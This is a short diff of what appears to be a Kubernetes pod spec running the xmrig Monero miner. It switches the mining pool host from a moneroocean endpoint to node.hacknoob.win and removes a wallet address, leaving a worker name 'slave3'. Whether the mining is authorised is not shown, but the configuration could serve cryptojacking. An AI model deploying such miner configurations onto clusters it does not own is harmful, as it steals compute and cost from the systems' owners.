@@ -20,10 +20,8 @@ spec:
     - -t
     - "1"
     - -o
-    - gulf.moneroocean.stream:80
+    - node.hacknoob.win
     - -u
-    - 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5
-    - -p
     - slave3
     volumeMounts:
     - name: xmrig-volume-3
